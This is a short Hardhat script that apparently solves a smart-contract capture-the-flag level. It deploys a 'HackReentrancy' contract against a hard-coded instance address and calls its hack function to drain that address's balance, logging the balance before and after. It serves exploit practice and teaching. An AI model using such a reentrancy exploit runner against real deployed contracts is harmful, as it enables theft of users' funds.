const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const HackReentrancy = await ethers.getContractFactory("HackReentrancy");

    // Deploy the HackReentrancy contract
    console.log('Deploying the HackReentrancy contract');
    contract = await HackReentrancy.deploy(instance_address);
    await contract.deployed();
    console.log(`Contract address: ${contract.address}`);

    let start_balance = await ethers.provider.getBalance(instance_address)
    console.log(`Reentracy contract balance: ${start_balance}`);

    console.log('Hacking...');
    let tx = await contract.hack({value: start_balance, gasLimit: 13500000});
    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log(`Reentracy contract balance: ${await ethers.provider.getBalance(instance_address)}`);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x8cBA4a87d01f1161DAfc0d356da5cc54a2B2f5AC';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
